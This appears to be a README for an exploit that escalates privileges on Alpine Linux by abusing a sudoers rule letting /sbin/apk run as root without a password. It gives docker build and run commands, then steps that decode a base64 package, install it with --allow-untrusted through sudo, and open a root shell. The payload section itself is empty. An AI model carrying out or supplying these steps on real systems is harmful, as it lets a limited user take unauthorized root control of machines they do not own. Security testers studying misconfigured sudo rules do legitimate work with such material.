# privesc-sudo-l-apk
`sudo -l` Exploit Privilege Escalation Alpine `(root) NOPASSWD: /sbin/apk`

## Build APK

```bash
docker build --no-cache --platform=linux/amd64 -t exploit-sudo-l-apk .
docker run -it --platform=linux/amd64 exploit-sudo-l-apk
```

## Install APK Exploit

```bash
echo <base64-encoded-apk> | base64 -d > nopasswd.apk
sudo /sbin/apk add --allow-untrusted nopasswd.apk
sudo bash
```

## APK x86_64 package in base64

```

```
